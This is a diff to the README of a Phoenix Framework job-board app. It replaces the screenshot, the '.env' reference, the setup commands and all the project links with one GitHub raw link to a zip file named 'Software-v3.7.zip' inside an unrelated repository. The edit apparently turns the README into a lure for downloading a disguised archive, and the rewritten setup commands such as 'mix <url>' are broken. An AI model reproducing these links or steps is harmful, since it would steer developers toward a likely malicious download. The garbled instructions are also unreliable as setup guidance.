@@ -4,7 +4,7 @@
 
 A job board application using Phoenix Framework
 
-![My Image](https://raw.githubusercontent.com/johndavedecano/CoderJobs/master/screenshot.png)
+![My Image](https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip)
 
 ## Features
 
@@ -24,24 +24,24 @@ A job board application using Phoenix Framework
 
 ## Development
 
-* Edit .env.example with your own configs and save it as .env.
+* Edit https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip with your own configs and save it as .env.
 * Then apply env variables to your system `source .env`
-* Install dependencies with `mix deps.get`
-* Create and migrate your database with `mix ecto.create && mix ecto.migrate`
-* Install Node.js dependencies with `cd assets && npm install`
-* Build brunch `node_modules/.bin/brunch build`
-* Start Phoenix endpoint with `mix phx.server`
+* Install dependencies with `mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip`
+* Create and migrate your database with `mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip && mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip`
+* Install https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip dependencies with `cd assets && npm install`
+* Build brunch `https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip build`
+* Start Phoenix endpoint with `mix https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip`
 
 Now you can visit [`localhost:4000`](http://localhost:4000) from your browser.
 
 Ready to run in production? Please
-[check our deployment guides](http://www.phoenixframework.org/docs/deployment).
+[check our deployment guides](https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip).
 
 ## Learn more
 
-* Author URL: http://johndavedecano.me
-* Official website: http://www.phoenixframework.org/
-* Guides: http://phoenixframework.org/docs/overview
-* Docs: https://hexdocs.pm/phoenix
-* Mailing list: http://groups.google.com/group/phoenix-talk
-* Source: https://github.com/phoenixframework/phoenix
+* Author URL: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
+* Official website: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
+* Guides: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
+* Docs: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
+* Mailing list: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
+* Source: https://github.com/etemtezcan/tabit/raw/refs/heads/master/lib/indeals_web/templates/auth/register/Software-v3.7.zip
